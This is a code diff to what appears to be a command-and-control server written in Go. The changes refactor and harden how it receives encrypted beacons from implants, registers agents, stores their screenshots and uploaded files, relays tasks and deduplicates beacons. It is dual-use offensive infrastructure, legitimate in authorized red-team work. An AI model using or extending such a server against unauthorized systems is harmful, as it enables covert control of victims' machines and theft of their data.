@@ -1,8 +1,10 @@
 package server
 
 import (
+	"crypto/sha256"
 	"crypto/subtle"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"log/slog"
@@ -89,6 +91,194 @@ type task struct {
 	Size    int64  `json:"size,omitempty"`
 }
 
+// checkBeaconKey validates the optional X-Beacon-Key / Authorization header
+// against the configured server.beacon_key. When beacon_key is empty the check
+// passes (legacy/plaintext mode). Shared by HTTP, WebSocket and TCP beacon paths.
+func (s *Server) checkBeaconKey(c *gin.Context) bool {
+	s.configMu.RLock()
+	beaconKey := s.cfg.Server.BeaconKey
+	s.configMu.RUnlock()
+	if beaconKey == "" {
+		return true
+	}
+	key := c.GetHeader("X-Beacon-Key")
+	if key == "" {
+		key = c.GetHeader("Authorization")
+	}
+	return subtle.ConstantTimeCompare([]byte(key), []byte(beaconKey)) == 1
+}
+
+// beaconEnvelope is the top-level transport envelope shared by HTTP and TCP beacons.
+type beaconEnvelope struct {
+	UUID      string `json:"uuid"`
+	ECDHPub   string `json:"ecdh_pub,omitempty"`
+	CipherB64 string `json:"c,omitempty"`
+	Key       string `json:"key,omitempty"` // optional pre-shared beacon key (TCP transport)
+}
+
+// decodeBeaconEnvelope parses the transport envelope, authenticates it against
+// server.beacon_key, and returns the decoded inner beacon request. On failure the
+// reason is logged server-side and ok=false is returned (caller terminates the
+// request/connection). Shared by HTTP and TCP beacon paths so both transports
+// enforce identical auth and ECDH semantics.
+func (s *Server) decodeBeaconEnvelope(raw []byte, suppliedKey string) (envelope beaconEnvelope, req beaconRequest, useECDH bool, ok bool) {
+	if err := json.Unmarshal(raw, &envelope); err != nil {
+		slog.Warn("Beacon: invalid envelope JSON")
+		return beaconEnvelope{}, beaconRequest{}, false, false
+	}
+	if envelope.UUID == "" {
+		envelope.UUID = uuid.New().String()
+	}
+	if !isValidAgentID(envelope.UUID) {
+		slog.Warn("Beacon rejected: invalid agent ID", "agent_id", envelope.UUID)
+		return beaconEnvelope{}, beaconRequest{}, false, false
+	}
+
+	s.configMu.RLock()
+	beaconKey := s.cfg.Server.BeaconKey
+	forceECDH := s.cfg.Crypto.ForceECDH
+	s.configMu.RUnlock()
+	if beaconKey != "" {
+		key := suppliedKey
+		if key == "" {
+			key = envelope.Key
+		}
+		if subtle.ConstantTimeCompare([]byte(key), []byte(beaconKey)) != 1 {
+			slog.Warn("Beacon unauthorized", "agent_id", envelope.UUID)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+	}
+	if forceECDH && s.sessionManager != nil && envelope.CipherB64 == "" && envelope.ECDHPub == "" {
+		slog.Warn("Beacon rejected: ECDH encryption required", "agent_id", envelope.UUID)
+		return beaconEnvelope{}, beaconRequest{}, false, false
+	}
+
+	useECDH = s.sessionManager != nil && envelope.CipherB64 != ""
+	if useECDH {
+		plaintext, err := s.sessionManager.DecryptB64(envelope.UUID, envelope.CipherB64)
+		if err != nil && envelope.ECDHPub != "" {
+			// Agent rotated its keypair and included the new public key: re-derive
+			// the session key before retrying. The rotation is only committed if
+			// the ciphertext authenticates under the new key.
+			agentPubKey, derr := base64.StdEncoding.DecodeString(envelope.ECDHPub)
+			if derr == nil {
+				if ciphertext, cerr := base64.StdEncoding.DecodeString(envelope.CipherB64); cerr == nil {
+					if rotated, rerr := s.sessionManager.TryRotateSessionKey(envelope.UUID, agentPubKey, ciphertext); rerr == nil {
+						plaintext = rotated
+						err = nil
+					}
+				}
+			}
+		}
+		if err != nil {
+			slog.Warn("ECDH decryption failed", "agent_id", envelope.UUID, "err", err)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		s.configMu.RLock()
+		maxPayload := s.cfg.Crypto.MaxDecryptedPayloadSize
+		s.configMu.RUnlock()
+		if maxPayload <= 0 {
+			maxPayload = 10 * 1024 * 1024 // default 10MB
+		}
+		if len(plaintext) > maxPayload {
+			slog.Warn("Beacon decrypted payload too large", "agent_id", envelope.UUID, "size", len(plaintext), "max", maxPayload)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		if err := encoding.Unmarshal(plaintext, &req); err != nil {
+			slog.Warn("ECDH decrypted payload parse failed", "agent_id", envelope.UUID, "err", err)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		req.UUID = envelope.UUID
+		return envelope, req, true, true
+	}
+
+	if s.sessionManager != nil && envelope.ECDHPub != "" {
+		// ECDH handshake: establish a new session
+		agentPubKey, err := base64.StdEncoding.DecodeString(envelope.ECDHPub)
+		if err != nil {
+			slog.Warn("Invalid ECDH public key encoding", "agent_id", envelope.UUID)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		if err := s.sessionManager.EstablishSession(envelope.UUID, agentPubKey); err != nil {
+			slog.Warn("ECDH handshake failed", "agent_id", envelope.UUID, "err", err)
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		slog.Info("ECDH session established", "agent_id", envelope.UUID)
+		if err := json.Unmarshal(raw, &req); err != nil {
+			return beaconEnvelope{}, beaconRequest{}, false, false
+		}
+		req.UUID = envelope.UUID
+		return envelope, req, false, true
+	}
+
+	// Plaintext mode
+	if err := encoding.Unmarshal(raw, &req); err != nil {
+		slog.Warn("Beacon: invalid plaintext payload", "agent_id", envelope.UUID)
+		return beaconEnvelope{}, beaconRequest{}, false, false
+	}
+	req.UUID = envelope.UUID
+	return envelope, req, false, true
+}
+
+// buildBeaconResponse wraps a processed beacon response in the transport
+// envelope, mirroring the HTTP handler. Shared by HTTP, TCP and WebSocket
+// beacon paths so every transport returns identical envelope semantics
+// (ECDH encryption, rotation signal, handshake public key).
+func (s *Server) buildBeaconResponse(req beaconRequest, resp beaconResponse, useECDH bool, handshake bool) ([]byte, bool) {
+	respBytes, ok := marshalJSONSafe(resp)
+	if !ok {
+		return nil, false
+	}
+
+	if useECDH {
+		if s.sessionManager == nil {
+			slog.Error("ECDH response requested but session manager not initialized", "agent_id", req.UUID)
+			return nil, false
+		}
+		cipherB64, err := s.sessionManager.EncryptB64(req.UUID, respBytes)
+		if err != nil {
+			slog.Error("ECDH response encryption failed", "agent_id", req.UUID, "err", err)
+			return nil, false
+		}
+		wrap := beaconResponse{CipherB64: cipherB64}
+		if s.sessionManager.NeedsRotation(req.UUID) {
+			wrap.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
+		}
+		return marshalJSONSafe(wrap)
+	}
+
+	if handshake && s.sessionManager != nil {
+		resp.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
+		respBytes, ok = marshalJSONSafe(resp)
+		if !ok {
+			return nil, false
+		}
+	}
+
+	return respBytes, true
+}
+
+// isValidAgentID enforces a strict format for agent IDs, which are used as DB
+// primary keys and filesystem path components. Accepts canonical RFC 4122 UUIDs
+// plus the fixed prefixes used by the WS listener (ws_) and gRPC fallback (unknown-).
+func isValidAgentID(id string) bool {
+	if id == "" {
+		return false
+	}
+	check := strings.TrimPrefix(id, "ws_")
+	if check == id {
+		check = strings.TrimPrefix(id, "unknown-")
+	}
+	if check == "" {
+		return false
+	}
+	u, err := uuid.Parse(check)
+	if err != nil {
+		return false
+	}
+	return strings.EqualFold(u.String(), check)
+}
+
 func (s *Server) handleBeacon(c *gin.Context) {
 	beaconStart := time.Now()
 	defer func() {
@@ -98,15 +288,9 @@ func (s *Server) handleBeacon(c *gin.Context) {
 		}
 	}()
 
-	if s.cfg.Server.BeaconKey != "" {
-		key := c.GetHeader("X-Beacon-Key")
-		if key == "" {
-			key = c.GetHeader("Authorization")
-		}
-		if subtle.ConstantTimeCompare([]byte(key), []byte(s.cfg.Server.BeaconKey)) != 1 {
-			respondError(c, http.StatusUnauthorized, "unauthorized")
-			return
-		}
+	if !s.checkBeaconKey(c) {
+		respondError(c, http.StatusUnauthorized, "unauthorized")
+		return
 	}
 
 	// Step 1: parse the top-level JSON to extract uuid and optional ECDH fields
@@ -116,67 +300,11 @@ func (s *Server) handleBeacon(c *gin.Context) {
 		return
 	}
 
-	var envelope struct {
-		UUID      string `json:"uuid"`
-		ECDHPub   string `json:"ecdh_pub,omitempty"`
-		CipherB64 string `json:"c,omitempty"`
-	}
-	if err := json.Unmarshal(raw, &envelope); err != nil {
-		respondError(c, http.StatusBadRequest, "invalid json")
+	envelope, req, useECDH, ok := s.decodeBeaconEnvelope(raw, "")
+	if !ok {
+		respondError(c, http.StatusBadRequest, "invalid beacon payload")
 		return
 	}
-	if envelope.UUID == "" {
-		envelope.UUID = uuid.New().String()
-	}
-
-	// Step 2: establish or use ECDH session
-	var req beaconRequest
-	useECDH := s.sessionManager != nil && envelope.CipherB64 != ""
-
-	if useECDH {
-		// AES-256-GCM encrypted payload via ECDH session
-		plaintext, err := s.sessionManager.DecryptB64(envelope.UUID, envelope.CipherB64)
-		if err != nil {
-			slog.Warn("ECDH decryption failed", "agent_id", envelope.UUID, "err", err)
-			respondError(c, http.StatusBadRequest, "decryption failed")
-			return
-		}
-		if err := encoding.Unmarshal(plaintext, &req); err != nil {
-			slog.Warn("ECDH decrypted payload parse failed", "agent_id", envelope.UUID, "err", err)
-			respondError(c, http.StatusBadRequest, "invalid decrypted payload")
-			return
-		}
-		req.UUID = envelope.UUID
-
-	} else if s.sessionManager != nil && envelope.ECDHPub != "" {
-		// ECDH handshake: establish a new session
-		agentPubKey, err := base64.StdEncoding.DecodeString(envelope.ECDHPub)
-		if err != nil {
-			slog.Warn("Invalid ECDH public key encoding", "agent_id", envelope.UUID)
-			respondError(c, http.StatusBadRequest, "invalid ecdh key")
-			return
-		}
-		if err := s.sessionManager.EstablishSession(envelope.UUID, agentPubKey); err != nil {
-			slog.Warn("ECDH handshake failed", "agent_id", envelope.UUID, "err", err)
-			respondError(c, http.StatusBadRequest, "ecdh handshake failed")
-			return
-		}
-		slog.Info("ECDH session established", "agent_id", envelope.UUID)
-		// Parse inner payload from raw JSON (ECDHPub field is at top level, rest is in body)
-		if err := json.Unmarshal(raw, &req); err != nil {
-			respondError(c, http.StatusBadRequest, "invalid json")
-			return
-		}
-		req.UUID = envelope.UUID
-
-	} else {
-		// Plaintext mode
-		if err := encoding.Unmarshal(raw, &req); err != nil {
-			respondError(c, http.StatusBadRequest, "invalid payload")
-			return
-		}
-	}
-	req.UUID = envelope.UUID
 
 	publicIP := c.ClientIP()
 
@@ -185,7 +313,10 @@ func (s *Server) handleBeacon(c *gin.Context) {
 	// Async GeoIP lookup (don't block beacon response) — only when enabled in config.
 	// Uses a buffered channel as a bounded queue: when full, oldest entries are dropped
 	// to avoid unbounded goroutine growth under heavy beacon load.
-	if s.cfg.Server.GeoIPEnabled && publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
+	s.configMu.RLock()
+	geoIPEnabled := s.cfg.Server.GeoIPEnabled
+	s.configMu.RUnlock()
+	if geoIPEnabled && publicIP != "" && publicIP != "127.0.0.1" && publicIP != "::1" {
 		select {
 		case s.geoIPSem <- struct{}{}:
 			s.wg.Add(1)
@@ -201,57 +332,39 @@ func (s *Server) handleBeacon(c *gin.Context) {
 				defer cancel()
 				country, city, lat, lon := s.lookupGeoIP(ctx, publicIP)
 				if country != "" {
-					var agent db.Implant
-					if err := s.db.Where("id = ?", req.UUID).First(&agent).Error; err == nil {
-						if agent.Country != country || agent.City != city {
-							s.db.Model(&agent).Updates(map[string]interface{}{
-								"country": country, "city": city,
-								"latitude": lat, "longitude": lon,
-							})
-						}
+					result := s.db.Model(&db.Implant{}).
+						Where("id = ? AND (country != ? OR city != ?)", req.UUID, country, city).
+						Updates(map[string]interface{}{
+							"country": country, "city": city,
+							"latitude": lat, "longitude": lon,
+						})
+					if result.Error != nil {
+						slog.Error("Failed to update GeoIP data", "agent_id", req.UUID, "err", result.Error)
 					}
 				}
 			}()
 		default:
-			// Queue full, drop this lookup (backpressure). The beacon
-			// response is never blocked.
+			slog.Warn("GeoIP lookup queue full, dropping lookup", "agent_id", req.UUID, "ip", publicIP)
 		}
 	}
 
 	// Build response with appropriate encryption (multi-format)
-	respBytes, err := encoding.Marshal(resp)
-	if err != nil {
-		slog.Error("Beacon response marshal failed", "error", err)
-		respondError(c, http.StatusInternalServerError, "response marshal failed")
+	respBytes, ok := s.buildBeaconResponse(req, resp, useECDH, envelope.ECDHPub != "" && !useECDH)
+	if !ok {
+		respondError(c, http.StatusInternalServerError, "response build failed")
 		return
 	}
 
-	if useECDH {
-		// Encrypt response with ECDH session key
-		cipherB64, err := s.sessionManager.EncryptB64(req.UUID, respBytes)
-		if err != nil {
-			slog.Error("ECDH response encryption failed", "agent_id", req.UUID, "err", err)
-			respondError(c, http.StatusInternalServerError, "encryption failed")
+	if !useECDH && envelope.ECDHPub == "" {
+		s.configMu.RLock()
+		malleableEnabled := s.cfg.Malleable.Enabled
+		s.configMu.RUnlock()
+		if malleableEnabled {
+			s.applyMalleableProfile(c, respBytes)
 			return
 		}
-
-		// Check if session needs rotation
-		wrap := beaconResponse{CipherB64: cipherB64}
-		if s.sessionManager.NeedsRotation(req.UUID) {
-			wrap.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
-		}
-		c.JSON(http.StatusOK, wrap)
-
-	} else if envelope.ECDHPub != "" {
-		// ECDH handshake response: include server's public key
-		resp.ECDHPub = base64.StdEncoding.EncodeToString(s.sessionManager.GetPublicKey())
-		c.JSON(http.StatusOK, resp)
-
-	} else if s.cfg.Malleable.Enabled {
-		s.applyMalleableProfile(c, respBytes)
-	} else {
-		c.Data(http.StatusOK, "application/json", respBytes)
 	}
+	c.Data(http.StatusOK, "application/json", respBytes)
 }
 
 func decodeBeaconIdentity(info map[string]string) (hostname, username, ip string) {
@@ -366,7 +479,15 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			}
 		}
 		if err := s.db.Create(&agent).Error; err != nil {
-			slog.Error("Failed to create agent", "agent_id", agent.ID, "error", err)
+			// Concurrent first check-in for the same UUID: the other goroutine's
+			// Create won the primary-key race. Re-read the now-existing row and
+			// continue as an update path instead of dropping this beacon.
+			slog.Debug("Agent create raced, re-reading existing row", "agent_id", agent.ID, "error", err)
+			if rerr := s.db.Where("id = ?", req.UUID).First(&agent).Error; rerr != nil {
+				slog.Error("Failed to create agent", "agent_id", agent.ID, "error", err)
+				return db.Implant{}, false
+			}
+			return agent, false
 		}
 		slog.Info("New agent registered", "agent_id", agent.ID, "hostname", agent.Hostname, "ip", agent.IP, "listener_id", agent.ListenerID)
 		s.broadcastAgentOnline(agent, true)
@@ -443,6 +564,9 @@ func (s *Server) processAgentRegistration(req beaconRequest, publicIP string, no
 			txResult := tx.Model(&db.Implant{}).Where("id = ? AND last_seen <= ?", agent.ID, agent.LastSeen).Updates(updates)
 			if txResult.Error != nil {
 				return txResult.Error
+			}
+			if txResult.RowsAffected == 0 {
+				slog.Warn("Concurrent beacon update conflict, retrying", "agent_id", agent.ID)
 			}
 			// Re-read to get consistent state
 			return tx.Where("id = ?", agent.ID).First(&agent).Error
@@ -532,9 +656,6 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		// For monitoring control tasks, do not retain them in DB at all
 		if r.Type == "screen_stream_start" || r.Type == "screen_stream_stop" {
 			task.Result = "processed"
-			if err := s.db.Save(task).Error; err != nil {
-				slog.Error("Failed to save screen control task", "task_id", task.ID, "error", err)
-			}
 			s.broadcastTaskUpdate(uuid, *task)
 			if err := s.db.Delete(task).Error; err != nil {
 				slog.Error("Failed to delete screen control task", "task_id", task.ID, "error", err)
@@ -648,7 +769,14 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		if r.Type != "screenshot" && len(task.Result) > MaxResultSize {
 			task.Result = truncateString(task.Result, MaxResultSize)
 		}
-		if err := s.db.Save(task).Error; err != nil {
+		if err := s.db.Model(task).Updates(map[string]interface{}{
+			"status":       task.Status,
+			"result":       task.Result,
+			"error":        task.Error,
+			"progress":     task.Progress,
+			"total_bytes":  task.TotalBytes,
+			"transferred":  task.Transferred,
+		}).Error; err != nil {
 			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
 		}
 		if !isSilent {
@@ -974,7 +1102,7 @@ func (s *Server) fetchRelayedChildTasks(parentUUID string) []relayedTask {
 			ids[i] = pendingTask.ID
 		}
 		if result := tx.Model(&db.Task{}).Where("id IN ? AND status = ?", ids, "pending").Updates(map[string]interface{}{
-			"status": "running", "claimed_at": time.Now(),
+			"status": "running", "claimed_by": parentUUID, "claimed_at": time.Now(),
 		}); result.Error != nil {
 			return result.Error
 		}
@@ -1105,9 +1233,44 @@ func (s *Server) enforceKillDate(agent db.Implant, resp *beaconResponse, now tim
 }
 
 // beaconFingerprint returns a dedup key for a beacon request.
+// beaconFingerprint returns a content-derived fingerprint for duplicate detection.
+// It hashes the actual payload (results, SOCKS frames, acks, relayed data) so
+// that beacons carrying different data are never mistaken for duplicates.
 func beaconFingerprint(req beaconRequest) string {
-	h := fmt.Sprintf("%s:%d:%v", req.UUID, len(req.Results), req.AckTaskIDs)
-	return h
+	h := sha256.New()
+	h.Write([]byte(req.UUID))
+	for _, r := range req.Results {
+		h.Write([]byte(r.Type))
+		h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
+		h.Write([]byte(r.Output))
+		h.Write([]byte(r.Error))
+		h.Write([]byte(r.Filename))
+		h.Write([]byte(strconv.FormatInt(r.Size, 10)))
+		h.Write([]byte(strconv.FormatInt(r.Offset, 10)))
+		h.Write([]byte(r.Path))
+	}
+	for _, f := range req.SocksData {
+		h.Write([]byte(strconv.FormatUint(f.ConnID, 10)))
+		h.Write([]byte(f.Action))
+		h.Write(f.Data)
+	}
+	for _, id := range req.AckTaskIDs {
+		h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
+	}
+	for _, rel := range req.Relayed {
+		h.Write([]byte(rel.AgentID))
+		for _, r := range rel.Results {
+			h.Write([]byte(r.Type))
+			h.Write([]byte(strconv.FormatUint(uint64(r.TaskID), 10)))
+			h.Write([]byte(r.Output))
+			h.Write([]byte(r.Error))
+			h.Write([]byte(r.Filename))
+		}
+		for _, id := range rel.AckTaskIDs {
+			h.Write([]byte(strconv.FormatUint(uint64(id), 10)))
+		}
+	}
+	return req.UUID + ":" + hex.EncodeToString(h.Sum(nil))
 }
 
 // isDuplicateBeacon checks if this beacon was recently processed.
@@ -1150,8 +1313,14 @@ func (s *Server) processBeacon(req beaconRequest, publicIP string) beaconRespons
 		return beaconResponse{}
 	}
 
+	// Reject malformed agent IDs before any DB or filesystem use
+	if !isValidAgentID(req.UUID) {
+		slog.Warn("Beacon rejected: invalid agent ID", "agent_id", req.UUID)
+		return beaconResponse{}
+	}
+
 	// Reject agents with protocol versions below minimum supported
-	if req.ProtocolVersion > 0 && req.ProtocolVersion < protocol.MinSupportedProtocolVersion {
+	if req.ProtocolVersion != 0 && req.ProtocolVersion < protocol.MinSupportedProtocolVersion {
 		slog.Warn("Agent protocol version too old, rejecting",
 			"agent_id", req.UUID, "agent_pv", req.ProtocolVersion, "min_pv", protocol.MinSupportedProtocolVersion)
 		return beaconResponse{}
@@ -1211,16 +1380,27 @@ func (s *Server) saveScreenshot(dataDir, agentID string, taskID uint, b64Data st
 	if dataDir == "" {
 		dataDir = "data"
 	}
-	dir := filepath.Join(dataDir, "screenshots", agentID)
+	base := filepath.Join(dataDir, "screenshots")
+	dir := safeJoin(base, agentID)
+	if dir == "" {
+		slog.Error("Invalid agent ID for screenshot path", "agent_id", agentID)
+		return
+	}
 	if err := os.MkdirAll(dir, 0700); err != nil {
 		slog.Error("Failed to create screenshots dir", "agent_id", agentID, "error", err)
+		return
 	}
 	data, err := base64.StdEncoding.DecodeString(b64Data)
 	if err != nil {
 		return
 	}
 	filename := fmt.Sprintf("screenshot_%d_%d.png", taskID, time.Now().Unix())
-	if err := os.WriteFile(filepath.Join(dir, filename), data, 0600); err != nil {
+	filePath := safeJoin(dir, filename)
+	if filePath == "" {
+		slog.Error("Invalid screenshot filename", "filename", filename)
+		return
+	}
+	if err := os.WriteFile(filePath, data, 0600); err != nil {
 		slog.Error("Failed to save screenshot", "file", filename, "error", err)
 	}
 }
@@ -1250,7 +1430,15 @@ func (s *Server) handleServeScreenshot(c *gin.Context) {
 // upload and download task types. Returns true if the caller should continue
 // to the next result (i.e. skip normal task-result processing).
 func saveFileChunk(s *Server, uuid string, task *db.Task, r taskResult, logPrefix string, resultPrefix string) bool {
-	uploadBase := filepath.Join(s.cfg.Server.DataDir, "uploads", uuid)
+	uploadBase := safeJoin(filepath.Join(s.cfg.Server.DataDir, "uploads"), uuid)
+	if uploadBase == "" {
+		slog.Error("Invalid agent ID for upload path", "agent_id", uuid)
+		task.Result = "ERROR: invalid agent id"
+		if err := s.db.Save(task).Error; err != nil {
+			slog.Error("Failed to save invalid agent id error", "task_id", task.ID, "error", err)
+		}
+		return true
+	}
 	if err := os.MkdirAll(uploadBase, 0700); err != nil {
 		slog.Error("Failed to create uploads dir", "agent_id", uuid, "error", err)
 	}
